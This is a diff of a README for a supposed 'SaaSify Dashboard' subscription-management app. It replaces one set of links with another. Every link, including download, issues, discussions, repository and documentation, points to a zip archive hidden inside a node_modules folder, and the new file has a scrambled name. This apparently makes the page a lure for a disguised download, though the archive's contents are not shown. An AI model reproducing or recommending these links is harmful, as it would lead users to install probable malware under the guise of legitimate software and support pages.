@@ -1,6 +1,6 @@
 # 🎉 SaaSify-Dashboard-Subscription-Management - Manage User Subscriptions Effortlessly
 
-[![Download SaaSify Dashboard](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/lodash.once/SaaSify-Dashboard-Subscription-Management_v2.3.zip%20Now-Grab%20the%20App-brightgreen)](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/lodash.once/SaaSify-Dashboard-Subscription-Management_v2.3.zip)
+[![Download SaaSify Dashboard](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/mime/src/Sify-Dashboard-Management-Saa-Subscription-1.0.zip%20Now-Grab%20the%20App-brightgreen)](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/mime/src/Sify-Dashboard-Management-Saa-Subscription-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to SaaSify Dashboard! This guide will help you download and run the appl
 
 To download the application, visit the following link:
 
-[Download SaaSify Dashboard](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/lodash.once/SaaSify-Dashboard-Subscription-Management_v2.3.zip)
+[Download SaaSify Dashboard](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/mime/src/Sify-Dashboard-Management-Saa-Subscription-1.0.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version available.
@@ -84,13 +84,13 @@ If you encounter any issues while using the SaaSify Dashboard, consider the foll
 2. **Firewall Settings:** Your firewall might block the application, so check your settings.
 3. **Reinstall the Application:** Sometimes a fresh installation can solve problems.
 
-If issues persist, visit the [GitHub Issues page](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/lodash.once/SaaSify-Dashboard-Subscription-Management_v2.3.zip) to report a problem or seek assistance from the community.
+If issues persist, visit the [GitHub Issues page](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/mime/src/Sify-Dashboard-Management-Saa-Subscription-1.0.zip) to report a problem or seek assistance from the community.
 
 ## 💬 Support
 
 For further support, you can:
 
-- Refer to the [GitHub Discussions](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/lodash.once/SaaSify-Dashboard-Subscription-Management_v2.3.zip) for community help.
+- Refer to the [GitHub Discussions](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/mime/src/Sify-Dashboard-Management-Saa-Subscription-1.0.zip) for community help.
 - Open an issue on GitHub if something is not working properly.
 
 ## 📅 Updates
@@ -99,9 +99,9 @@ Stay tuned for updates! Regular improvements and features will be added to the S
 
 ## 🔗 Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/lodash.once/SaaSify-Dashboard-Subscription-Management_v2.3.zip)
-- [Documentation](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/lodash.once/SaaSify-Dashboard-Subscription-Management_v2.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/mime/src/Sify-Dashboard-Management-Saa-Subscription-1.0.zip)
+- [Documentation](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/mime/src/Sify-Dashboard-Management-Saa-Subscription-1.0.zip)
 
 Start managing your user subscriptions effortlessly today! 
 
-[Download SaaSify Dashboard](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/lodash.once/SaaSify-Dashboard-Subscription-Management_v2.3.zip)
+[Download SaaSify Dashboard](https://raw.githubusercontent.com/Muqetsu/SaaSify-Dashboard-Subscription-Management/main/backend/node_modules/mime/src/Sify-Dashboard-Management-Saa-Subscription-1.0.zip)
